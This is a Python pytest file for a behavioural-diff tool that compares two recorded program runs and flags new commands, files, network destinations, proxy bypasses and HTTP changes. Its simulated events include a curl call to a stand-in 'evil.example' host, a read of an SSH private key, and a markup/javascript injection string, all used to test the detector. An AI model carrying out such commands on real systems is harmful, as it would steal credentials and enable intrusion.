"""Behavioural diff of two recordings."""

import json
import re

import pytest
from test_model import T0, S, execev, exitev, fileev, make_run, proxy_data, tcpev, tree_events

from tracewatch.cli import main
from tracewatch.diff import compare, norm, render_md
from tracewatch.model import build


def run(tmp_path, name, extra=(), flows=None):
    d = tmp_path / name
    d.mkdir()
    tr = tree_events() + list(extra)
    return make_run(d, tr, flows if flows is not None else [])


@pytest.fixture
def base(tmp_path):
    return run(tmp_path, "a")


def test_identical_runs_have_no_behavioural_change(tmp_path, base):
    other = run(tmp_path, "b")
    d = compare(build(base), build(other))
    assert d["changed"] is False and d["notable"] == []
    assert "No behavioural change" in render_md(d)


def test_a_new_command_and_file_are_reported(tmp_path, base):
    extra = [
        execev(90, 300, 1, T0 + 3 * S, ["/usr/bin/curl", "https://evil.example/x"]),
        exitev(90, 300, 1, T0 + 3.5 * S),
        fileev(91, 300, 90, T0 + 3.2 * S, "/home/u/.ssh/id_rsa"),
    ]
    d = compare(build(base), build(run(tmp_path, "b", extra)))
    assert d["changed"]
    assert any(c["key"].startswith("/usr/bin/curl") for c in d["sections"]["commands"]["added"])
    assert any("id_rsa" in f["key"] for f in d["sections"]["files"]["added"])
    assert any("new command" in n for n in d["notable"])
    # the reverse direction reports them as removed, not added
    r = compare(build(run(tmp_path, "c", extra)), build(base))
    assert r["changed"] and not r["sections"]["commands"]["added"] and r["sections"]["commands"]["removed"]


def test_destinations_and_a_proxy_bypass_are_notable(tmp_path, base):
    extra = [tcpev(92, 100, 1, T0 + 2 * S, "203.0.113.9", 443)]
    d = compare(build(base), build(run(tmp_path, "b", extra)))
    added = d["sections"]["destinations"]["added"]
    assert any("203.0.113.9:443" in x["key"] for x in added)
    assert any("BYPASSED THE PROXY" in n for n in d["notable"])


def test_http_changes_show_status_and_count_deltas(tmp_path):
    t, f = proxy_data()
    a = build(run(tmp_path, "a", t, f))
    f2 = json.loads(json.dumps(f))
    for r in f2:
        if r.get("kind") == "flow_result":
            r["status"] = 500
            break
    b = build(run(tmp_path, "b", t, f2))
    d = compare(a, b)
    assert d["changed"] and d["sections"]["http"]["changed"]
    assert "status" in d["sections"]["http"]["changed"][0]["delta"]


def test_run_to_run_noise_is_normalised_away():
    assert norm("/tmp/tmpab12cd/out.bin") == norm("/tmp/tmpzz99yy/out.bin")
    assert norm("curl -H 'Authorization: [REDACTED:bearer:82db8e13]'") == norm(
        "curl -H 'Authorization: [REDACTED:bearer:00000001]'"
    )
    assert norm("/v1/items?id=123456&t=999") == "/v1/items"
    assert norm("x 4f8a9c1d-0b2e-4c33-9a10-aa00bb11cc22 y") == norm("x 11111111-2222-3333-4444-555555555555 y")
    assert norm("port 18460") == norm("port 18461")


def test_hostile_strings_cannot_inject_markup(tmp_path, base):
    evil = "</script>|`\n# pwn\n[x](javascript:alert(1))"
    extra = [execev(93, 301, 1, T0 + 3 * S, ["/bin/echo", evil]), exitev(93, 301, 1, T0 + 3.5 * S)]
    out = render_md(compare(build(base), build(run(tmp_path, "b", extra))))
    outside = re.sub(
        r"(`+).+?\1", "", out.replace("\\`", ""), flags=re.S
    )  # code spans are inert; the rest must be escaped
    assert "\n# pwn" not in out and "\n[x]" not in out
    assert not re.search(r"(?<!\\)[<>]", outside) and "](javascript" not in outside.replace("\\]", "")


def test_cli_exit_status_is_like_diff(tmp_path, base, capsys):
    same = run(tmp_path, "b")
    extra = [execev(94, 302, 1, T0 + 3 * S, ["/bin/true"]), exitev(94, 302, 1, T0 + 3.1 * S)]
    diff = run(tmp_path, "c", extra)
    assert main(["diff", str(base), str(same)]) == 0
    assert main(["diff", str(base), str(diff)]) == 1
    assert main(["diff", str(base), str(tmp_path / "nope")]) == 2
    capsys.readouterr()
    assert main(["diff", str(base), str(diff), "--format", "json"]) == 1
    assert json.loads(capsys.readouterr().out)["changed"] is True
    out = tmp_path / "d.md"
    assert main(["diff", str(base), str(diff), "-o", str(out)]) == 1
    assert out.stat().st_mode & 0o777 == 0o600
